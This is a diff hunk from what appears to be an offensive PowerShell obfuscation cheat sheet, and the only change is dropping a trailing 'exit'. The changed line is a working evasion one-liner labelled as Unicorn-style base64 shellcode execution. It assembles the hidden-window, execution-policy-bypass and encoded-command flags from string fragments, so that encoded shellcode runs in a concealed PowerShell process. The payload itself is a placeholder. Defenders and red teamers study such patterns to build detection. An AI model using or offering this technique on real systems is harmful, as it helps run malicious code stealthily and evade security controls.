@@ -622,7 +622,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - File **Unicorn.ps1** (base64 shellcode execution)
 
-      $syscall=("{1}{0}" -f'N','-Wi'); $flag=("{1}{0}{2}" -f'Id','h','DEn'); $cert=("{1}{0}" -f'p','-E'); $pem=("{1}{2}{0}" -f'SS','by','pA'); powershell $syscall $flag $cert $pem -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"; exit
+      $syscall=("{1}{0}" -f'N','-Wi'); $flag=("{1}{0}{2}" -f'Id','h','DEn'); $cert=("{1}{0}" -f'p','-E'); $pem=("{1}{2}{0}" -f'SS','by','pA'); powershell $syscall $flag $cert $pem -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"
 
 ![powershell obfuscation](http://i.cubeupload.com/CzJJc0.png)
 
